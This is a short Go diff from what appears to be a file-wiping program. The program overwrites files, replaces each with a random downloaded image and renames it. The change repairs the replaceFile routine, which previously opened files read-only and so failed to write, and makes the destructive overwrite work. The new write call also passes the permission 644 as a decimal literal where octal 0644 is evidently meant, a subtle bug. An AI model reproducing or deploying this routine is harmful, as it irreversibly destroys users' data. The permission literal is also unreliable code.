@@ -1,7 +1,6 @@
 package main
 
 import (
-	"io"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
@@ -76,14 +75,9 @@ func scorch(path string) {
 func replaceFile(file string, pics []*http.Response) {
 	scorch(file)                          // thoroughly overwrite file
 	replaceNumber := rand.Intn(len(pics)) // decide which image to replace file with
-	f, err := os.Open(file)
-	if err != nil {
-		return
-	}
-	_, _ = io.Copy(f, pics[replaceNumber].Body) // write image on old file location
+
+	body, _ := ioutil.ReadAll(pics[replaceNumber].Body)
+
+	_ = ioutil.WriteFile(file, body, 644) // write image on old file location
 	renameFile(file, PICNAMES[replaceNumber])
-	cerr := f.Close()
-	if cerr == nil {
-		return
-	}
 }
